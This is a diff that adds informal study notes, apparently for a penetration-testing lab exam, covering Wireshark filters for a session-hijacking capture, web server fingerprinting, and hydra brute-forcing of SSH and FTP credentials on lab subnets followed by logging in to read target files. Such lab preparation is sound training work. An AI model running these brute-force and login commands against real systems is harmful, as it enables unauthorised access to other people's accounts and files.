@@ -1169,7 +1169,47 @@ Perform vulnerability search using searchsploit tool and determine the path of A
 
 
 
+An attacker tried to perform session hijacking on a machine from 172.30.10.0/24 subnet. An incident handler found a packet capture file $_Jack.pcapng obtained from the victim machine which is stored in Documents folder  You are assigned to analyse the packet capture file and determine the IP of the victim machine targeted by the attacker. 
 
+
+ip.addr == 172.30.10.0/24
+
+tcp.analysis.flags
+
+tcp.analysis.flags
+This highlights:
+	• Retransmissions
+	• Out‑of‑order packets
+	• Duplicate ACKs
+Spurious retransmissions
+
+ http.request.method == POST  LOGIN DETAILS wireshark
+
+Search for ip with multiple login attemps - honeypot attempt 
+
+curl -I http://www.site.com  webserver techonology
+whatweb  www.site.com
+ Your mission is to crack the SSH credentials for Martin’s machine within the 192.168.10.0/24 subnet and retrieve the password from the $ollers.txt file.
+
+use hydra for ssh password 
+
+hydra -l Martin -P password.txt 192.168.10.101
+ssh Martin@192.168.10.101   enter password and get the file
+cd Desktop
+Dir
+type $ollers.txt
+more $ollers.txt
+bye
+
+ftp credential 
+
+- nmap -p 22 192.168.10.0/24 --open (you found 4 ips)
+- ping found ips to know which is linux with ttl value <= 64
+- hydra -l nick -P password.txt ftp://192.168.10.111
+- ftp 192.168.10.111
+- login ftp with that password 
+
+ls -a for hiddenfile 
 
 
 
